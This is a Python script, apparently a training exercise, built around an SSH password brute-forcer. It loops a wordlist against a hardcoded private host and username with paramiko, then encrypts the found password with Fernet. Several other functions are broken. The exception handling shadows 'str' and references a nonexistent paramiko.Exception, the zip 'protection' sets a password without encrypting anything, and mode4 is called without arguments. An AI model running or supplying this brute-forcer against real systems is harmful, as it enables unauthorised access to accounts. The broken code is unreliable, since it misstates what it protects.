#!/usr/bin/python3

# Script : OpsChallenge18.py
# Purpose: 
# Why    : 

import time
import paramiko
from cryptography.fernet import Fernet
import zipfile

### funtions
# Function name: mode1
# Purpose      : Opens a file with one word at each line and displays those words at 1 second intervals
# Arguments    : file
# Return       : none
def mode1(file):
    print("\n")
    
    with open(file, 'r') as file:
        wordlist = file.read().splitlines()

    for w in wordlist:
        time.sleep(1)  
        print(w)
    

# Function name: mode2
# Purpose      : Verifies if the string passed as an argument is in the wordlist passed as another argument
# Arguments    : string, wordlist
# Return       : none
def mode2(string,wordlist):
    if(string in wordlist):
        print(f"\nThe string \"{string}\" was found!")
    else:
        print(f"\nThe string \"{string}\" was not found!")

# Function name: mode3
# Purpose      : Makes a SSH connection
# Arguments    : hostname, username, password, port
# Return       : none
def mode3(hostname, username, password, port):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(hostname=hostname, port=port, username=username, password=password, timeout=3)
        print(f"Successful login with password: {password}")

        ssh.close()
    except paramiko.AuthenticationException:
        print(f"Failed login attempt with password: {password}")
    except paramiko.SSHException as e:
        print(f"SSH Exception: {str(e)}")
    except paramiko.Exception as e:
        print(f"Error: {str(e)}")
    except:
        print("\n ----- Something went wrong -----\n")

# Function name: mode3_v2
# Purpose      : Takes a worlist to brute force a SSH connection
# Arguments    : hostname, username, wordlist, port
# Return       : none
def mode3_v2(hostname, username, wordlist, port,fernet):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    with open(wordlist, 'r') as wordlist:
        wordlist = wordlist.read().splitlines()
        
    for str in wordlist:
        try:
            ssh.connect(hostname=hostname, port=port, username=username, password=str, timeout=3)
            print(f"Successful login with password: {str}")

            ssh.close()
            
            encrypt_string(str,fernet)
            break
        except paramiko.AuthenticationException:
            print(f"Failed login attempt with password: {str}")
        except paramiko.SSHException as e:
            print(f"SSH Exception: {str(e)}")
        except paramiko.Exception as e:
            print(f"Error: {str(e)}")
        except:
            print("\n ----- Something went wrong -----\n")
            
# Function name: write_key
# Purpose      : Generates a key that will be used to encrypt and decrypt and save it to a file. Symmetric cryptography.
# Arguments    : none
# Return       : none
def write_key():
    key = Fernet.generate_key()
    with open("key","wb") as key_file:
        key_file.write(key)

# Function name: load_key
# Purpose      : Loads the key saved in a file
# Arguments    : none
# Return       : The key read from the file
def load_key():
    return open("key","rb").read()

# Function name: get_key
# Purpose      : get the key
# Arguments    : none
# Return       : The key returned by load_key() function
def get_key():
    try:
        return load_key()
    except FileNotFoundError:
        write_key()
        return load_key()
    except:
        print("\n ----- An unexpected error occured during a load key -----\n")
                  
# Function name: encrypt_string
# Purpose      : Encrypts a string and print to the standard output the ciphertext
# Arguments    : string, fernet
# Return       : none
def encrypt_string(string,fernet):
    encoded_string   = string.encode()
    encrypted_string = fernet.encrypt(encoded_string).decode()
    print(f"\nCiphertext: {encrypted_string}\n")

def create_encrypted_zip(file_path, zip_file_path, passwd):
    try:
        with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            zip_file.setpassword(passwd.encode())
            zip_file.write(file_path)
    except FileNotFoundError:
        print("\nThe file does not exists! \n")
        

   
def unzip_file(zip_file_path, extract_path, passwd):
    with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
        zip_ref.setpassword(passwd.encode())
        zip_ref.extractall(extract_path)
        
              
def mode4(file_path, zip_file_path, passwd):
    zip = [zip_file_path,".zip"]
    zip = ''.join(zip)
    create_encrypted_zip(file_path, zip, passwd)
    
    ### unzip
    unzip_file("file.zip", "/home/vascolucas01" ,"file")
    
 
  
  
  
    
def main(): 

    # initialize the Fernet class
    fernet = Fernet(get_key())
    
    while(True):
        
        user_input = input("\n\n---> Select one of the modes (1,2,3 or q):\n\nMode 1: Offensive; Dictionary Iterator\nMode 2: Defensive; Password Recognized\nMode 3: Authenticate to an SSH server by its IP address\nMode 4: Protect Zip file with Password \nMode q: Quit\n\n>")
        
        match(user_input):
            case "1":
                wordlist = input("\nEnter the path to the wordlist:\n\n>")
                mode1(wordlist)
            case "2":
                string = input("\nEnter a string:\n\n>")
                wordlist = input("\nEnter the path to the wordlist:\n\n>")
                mode2(string,wordlist)
            case "3":
                # mode3(hostname, username, password, port)
                # mode3("192.168.1.139", "vasco", wordlist, 22)
                # mode3_v2(hostname, username, wordlist, port)
                wordlist = input("\nEnter the path to the wordlist:\n\n>")
                mode3_v2("192.168.1.139", "vasco", wordlist, 22, fernet)
            case "4": 
                
                ### zip
                file_path     = input("\nEnter the file:\n\n>")
                zip_file_path = input("\nEnter the zip file:\n\n>") 
                passwd        = input("\nEnter the password:\n\n>")

                mode4()
                
            case "q":
                print("\nQuitting...")
                break
            case _:
                print("\n ----- You do not entered a correct option. Try again -----\n")
            
if __name__ == "__main__":
    main()
